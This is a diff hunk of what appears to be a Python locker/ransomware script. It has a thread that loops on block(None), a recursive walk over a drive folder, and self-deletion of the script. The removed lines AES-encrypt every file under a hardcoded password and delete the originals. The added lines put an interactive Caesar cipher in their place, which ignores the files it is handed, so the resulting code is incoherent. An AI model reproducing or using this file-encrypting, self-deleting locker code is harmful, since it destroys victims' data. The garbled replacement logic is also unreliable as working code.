@@ -31,17 +31,31 @@ def locker():
 	while k!=True: block(None)
 def crypter():
 	def crypt(file):
-		password="qwerty"
-		bufferSize = 512*1024
-		pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, bufferSize)
-		print("[crypted] '"+str(file)+".crp'")
-		os.remove(file)
+		cryptMode = input("[E]ncrypt|[D]ecrypt: ").upper()
+		if cryptMode not in ['E', 'D']:
+				print("Error: mode is not Found!");
+				raise SystemExit
+		startMessage = input("Write the message: ").upper()
+		try:
+				rotKey = int(input("Write the key: "))
+		except ValueError:
+				print("Only numbers!"); raise SystemExit
+
+		def encryptDecrypt(mode, message, key, final=""):
+				for symbol in message:
+						if mode == 'E':
+								final += chr((ord(symbol) + key - 13) % 26 + ord('A'))
+						else:
+								final += chr((ord(symbol) - key - 13) % 26 + ord('A'))
+				return final
+
+		print("Final message:", encryptDecrypt(cryptMode, startMessage, rotKey))
 	def walk(dir):
 		for name in os.listdir(dir):
 			path = os.path.join(dir, name)
 			if os.path.isfile(path): crypt(path)
 			else: walk(path)
-	walk("D:\distr")
+	walk("D:\321321")
 	os.remove(str(sys.argv[0]))
 thread_1 = Thread(target=locker)
 thread_2 = Thread(target=crypter)
